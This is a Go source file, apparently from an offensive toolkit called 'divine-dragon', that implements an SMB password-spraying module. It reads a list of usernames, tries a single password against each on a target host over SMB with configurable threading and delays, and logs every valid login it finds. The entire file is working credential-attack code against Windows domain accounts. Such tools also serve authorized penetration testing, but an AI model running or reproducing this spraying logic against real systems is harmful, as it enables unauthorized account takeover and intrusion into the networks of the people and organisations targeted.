package remote_exploit

import (
	"bufio"
	"context"
	"divine-dragon/transport"
	"divine-dragon/util"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/hirochachacha/go-smb2"
)

type SmbSprayModule struct {
	remoteHost   string
	remotePort   string
	usernamelist string
	password     string
	domain       string

	conn      net.Conn
	s         *smb2.Session
	ctx       context.Context
	cancel    context.CancelFunc
	threads   int
	delay     int
	counter   int32
	successes int32

	logger util.Logger
}

func NewSmbSprayModule(domainOpt string, remoteHostOpt string, remotePortOpt string,
	usernamelistOpt string, passwordOpt string, verboseOpt bool,
	logFileNameOpt string, threadsOpt int, delayOpt int) *SmbSprayModule {
	ssm := SmbSprayModule{
		domain:       domainOpt,
		remoteHost:   remoteHostOpt,
		remotePort:   remotePortOpt,
		usernamelist: usernamelistOpt,
		password:     passwordOpt}
	ssm.ctx, ssm.cancel = context.WithCancel(context.Background())
	ssm.logger = util.SmbSprayLogger(verboseOpt, logFileNameOpt)
	ssm.delay = delayOpt
	if delayOpt != 0 {
		ssm.threads = 1
		ssm.logger.Log.Infof("Delay set. Using single thread and delaying %dms between attempts\n", ssm.delay)
	} else {
		ssm.threads = threadsOpt
	}
	return &ssm
}

func (ssm *SmbSprayModule) Run() {
	usersChan := make(chan string, ssm.threads)
	defer ssm.cancel()

	var wg sync.WaitGroup
	wg.Add(ssm.threads)

	var scanner *bufio.Scanner
	if ssm.usernamelist != "-" {
		file, err := os.Open(ssm.usernamelist)
		if err != nil {
			ssm.logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	for i := 0; i < ssm.threads; i++ {
		go ssm.makeSprayWorker(ssm.ctx, usersChan, &wg, ssm.password)
	}

	start := time.Now()

Scan:
	for scanner.Scan() {
		select {
		case <-ssm.ctx.Done():
			break Scan
		default:
			usernameline := scanner.Text()
			username, err := util.FormatUsername(usernameline)
			if err != nil {
				ssm.logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
				continue
			}
			time.Sleep(time.Duration(ssm.delay) * time.Millisecond)
			usersChan <- username
		}
	}
	close(usersChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&ssm.counter)
	finalSuccess := atomic.LoadInt32(&ssm.successes)
	ssm.logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		ssm.logger.Log.Error(err.Error())
	}
}

func (ssm *SmbSprayModule) makeSprayWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup, password string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			ssm.doOneLogin(ctx, username, password)
		}
	}
}

func (ssm *SmbSprayModule) doOneLogin(ctx context.Context, username string, password string) {
	atomic.AddInt32(&ssm.counter, 1)
	// login := fmt.Sprintf("%v@%v:%v", username, ssm.domain, password)Ñ‘
	conn, s, err := transport.SmbConnect(ssm.remoteHost, ssm.remotePort, ssm.domain, username, password, "")
	if conn != nil && s != nil {
		atomic.AddInt32(&ssm.successes, 1)
		if err != nil {
			ssm.logger.Log.Noticef("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)", username, err)
		} else {
			ssm.logger.Log.Noticef("[+] Connected to %s on port %s and opened a session as %s", ssm.remoteHost, ssm.remotePort, username)
		}
	} else {
		ok, errorString := transport.SmbHandleAuthError(err)
		if !ok {
			ssm.logger.Log.Errorf("[!] %v - %v", username, errorString)
			ssm.cancel()
		} else {
			ssm.logger.Log.Debugf("[!] %v - %v", username, errorString)
		}
	}
	// defer transport.SmbClose(conn, s)
}
